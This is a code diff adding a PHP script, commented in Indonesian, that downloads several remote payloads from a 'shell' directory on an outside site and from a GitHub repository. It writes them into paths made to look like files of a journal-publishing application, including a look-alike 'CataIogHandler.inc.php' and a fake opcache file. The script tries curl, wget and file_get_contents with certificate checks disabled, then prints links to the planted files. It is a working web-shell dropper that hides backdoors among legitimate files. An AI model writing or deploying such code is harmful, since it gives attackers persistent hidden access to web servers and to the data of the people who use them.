@@ -1,0 +1,90 @@
+<?php
+
+// === KONFIGURASI ===
+// Format: 'URL' => 'nama_file.php'
+$uploads = [
+    ['url' => 'https://obeydasupreme.site/shell/obs1.txt', 'target' => 'tools/update.php'],
+    ['url' => 'https://obeydasupreme.site/shell/ahshit.txt', 'target' => 'api/v1/announcements/announcementsHandler.inc.php'],
+    ['url' => 'https://obeydasupreme.site/shell/obstiny.txt', 'target' => 'cache/opcache/opcache-17f8f1244c929372dcb3ec67665d01e5s224e62dv.php'],
+    ['url' => 'https://obeydasupreme.site/shell/obsgecko.txt', 'target' => 'classes/migration/install/ArticleMigration.php'],
+    ['url' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/papikeng.php', 'target' => 'controllers/grid/articleGalleys/ArticleGalleyGridColumn.php'],
+    ['url' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obsalfa.php', 'target' => 'jobs/statistics/DeleteUsageStatsTemporaryRecords.php'],
+    ['url' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obsalfa.php', 'target' => 'pages/catalog/CataIogHandler.inc.php'],
+    ['url' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obsalfa.php', 'target' => 'templates/frontend/objects/index.php'],
+];
+
+// Fungsi download
+function downloadWithCurl($url)
+{
+    if (!function_exists('curl_init'))
+        return false;
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 10,
+    ]);
+    $data = curl_exec($ch);
+    curl_close($ch);
+    return $data !== false ? $data : false;
+}
+
+function downloadWithWget($url)
+{
+    $tmpFile = tempnam(sys_get_temp_dir(), 'wget_');
+    $command = "wget --no-check-certificate -q -O " . escapeshellarg($tmpFile) . " " . escapeshellarg($url);
+    shell_exec($command);
+    if (file_exists($tmpFile) && filesize($tmpFile) > 0) {
+        $data = file_get_contents($tmpFile);
+        unlink($tmpFile);
+        return $data;
+    }
+    return false;
+}
+
+function downloadWithFileGetContents($url)
+{
+    $context = stream_context_create([
+        'http' => ['timeout' => 10]
+    ]);
+    return @file_get_contents($url, false, $context);
+}
+
+$methods = [
+    'curl' => 'downloadWithCurl',
+    'wget' => 'downloadWithWget',
+    'file_get_contents' => 'downloadWithFileGetContents',
+];
+
+// Proses tiap URL
+foreach ($uploads as $item) {
+    $url = $item['url'];
+    $filename = $item['target'];
+
+    $savePath = $filename;
+    $data = false;
+    $methodUsed = '';
+
+    foreach ($methods as $method => $func) {
+        $data = $func($url);
+        if ($data !== false) {
+            $methodUsed = $method;
+            break;
+        }
+    }
+
+    if ($data !== false) {
+        // Buat folder kalau belum ada
+        $folderPath = dirname($savePath);
+        if (!is_dir($folderPath)) {
+            mkdir($folderPath, 0755, true);
+        }
+
+        file_put_contents($savePath, $data);
+        $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
+        echo "ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ <a href='https://$domain/$filename' target='_blank'><b>$filename</b></a> berhasil via <b>$methodUsed</b><br>";
+    } else {
+        echo "ÃƒÂ¢Ã…â€™ <b>$filename</b> gagal diunduh dari <code>$url</code><br>";
+    }
+}
